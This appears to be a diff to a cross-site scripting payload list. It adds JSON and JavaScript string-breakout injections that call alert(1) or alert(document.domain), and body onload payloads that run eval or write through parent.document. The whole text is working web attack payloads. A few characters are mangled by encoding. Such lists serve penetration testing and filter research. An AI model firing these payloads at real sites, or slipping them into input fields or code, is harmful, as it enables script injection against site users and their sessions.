@@ -3,3 +3,19 @@
 <body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
 <body/s/onload=x={doc:parent.document};x.doc.writeln(1)
 <body/????$/onload=x={doc:parent[�document�]};x.doc.writeln(1)
+";alert(1);//"
+"};alert(1);//"
+"}];alert(1);//"
+"]};alert(1);//"
+","x":alert(1),"y":"1
+0,"x":alert(1),"y":0
+"},"x":alert(document.domain),"y":"1
+"}]});alert(1);//"
+"@x":{"y":alert(1)}//
+"]}};alert(1);//"
+\");alert(1);//"
+","callback":"alert(1)","dummy":"x
+"onload":"alert(1)"
+<body onload="var a={x:eval};a.x('alert(1)')">
+<body onload="a={x:this.parent.document};a.x.write(1)">
+
